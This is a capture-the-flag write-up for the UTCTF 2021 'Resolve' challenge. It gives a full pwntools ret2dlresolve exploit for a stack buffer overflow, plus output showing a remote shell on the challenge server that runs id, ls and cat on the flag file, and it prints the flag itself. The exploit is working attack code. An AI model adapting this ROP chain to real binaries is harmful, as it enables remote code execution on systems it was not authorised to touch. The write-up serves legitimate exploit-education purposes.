## Resolve

```
980

Yeah you have an overflow, but where do you even jump to? If only there was some sort of way to find the address of system.

nc pwn.utctf.live 5435

--trab
```

Tags: _pwn_ _x86-64_ _bof_ _ret2dlresolve_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./resolve')

rop = ROP(binary)
ret = rop.find_gadget(['ret'])[0]

dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])

rop.raw(ret)
rop.gets(dl.data_addr)
rop.ret2dlresolve(dl)

if args.REMOTE:
	p = remote('pwn.utctf.live', 5435)
else:
	p = process(binary.path)

payload  = b''
payload += 0x10 * b'A'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendline(payload)
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/utctf2021/resolve/resolve'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './resolve'
[+] Opening connection to pwn.utctf.live on port 5435: Done
[*] Switching to interactive mode
$ id
uid=1000(resolve) gid=1000(resolve) groups=1000(resolve)
$ ls -l
total 4
-rw-r--r-- 1 root root 45 Mar 12 18:38 flag.txt
$ cat flag.txt
utflag{2_linker_problems_in_one_ctf?8079235}
```
